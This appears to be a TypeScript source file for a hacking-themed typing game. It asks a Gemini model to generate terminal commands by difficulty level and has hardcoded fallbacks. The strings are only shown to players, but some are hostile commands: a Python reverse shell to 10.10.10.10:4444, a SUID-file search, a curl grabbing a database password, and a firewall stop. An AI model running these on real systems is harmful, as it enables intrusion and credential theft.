import { GoogleGenAI } from '@google/genai';

export const generatePayload = async (difficulty: string, serverName: string): Promise<string[]> => {
  const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
  try {
    const response = await ai.models.generateContent({
      model: 'gemini-3-pro-preview',
      contents: `You are the core logic engine for QUANTUM_BREACH V1. 
      Generate exactly 3 unique, non-repetitive terminal commands for a hacking simulation. 
      The target node is '${serverName}' with security rank '${difficulty}'.
      
      STRICT CHARACTER LENGTH CONSTRAINTS (Crucial):
      - EASY: 5-12 chars (e.g., 'cat /flag', 'ls -a')
      - MEDIUM: 18-30 chars (e.g., 'systemctl stop firewalld', 'ssh-keygen -t rsa')
      - HARD: 45-65 chars (e.g., 'grep -r "PASS" /var/www/html | awk \'{print $1}\' | sort | uniq')
      - PRO: 85-130 chars (Extremely complex, symbol-heavy one-liners involving regex, multi-stage pipes, and base64 decoding)
      
      Requirements:
      1. No cliché commands. Use varied tools (sed, awk, openssl, tcpdump, nc, python -c, etc).
      2. Ensure codes are syntactically interesting.
      3. Return ONLY the 3 lines, one per line. No numbering.`,
      config: {
        thinkingConfig: { thinkingBudget: 2000 },
        temperature: 1.0,
      }
    });

    const text = response.text || '';
    return text.split('\n').filter(line => line.trim().length > 0).slice(0, 3);
  } catch (error) {
    console.error('Failed to generate payload:', error);
    // Hardcoded scaled fallbacks if API fails
    if (difficulty === 'EASY') return ["id", "cat flag", "ls /bin"];
    if (difficulty === 'MEDIUM') return ["systemctl status sshd", "netstat -antp | grep 80", "tar -czf bck.tgz /var"];
    if (difficulty === 'HARD') return ["find / -perm -4000 2>/dev/null | xargs -I{} ls -ld {}", "curl -s http://internal.lan/config.php | grep 'DB_PASS'"];
    return ["python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/bash\")'"];
  }
};
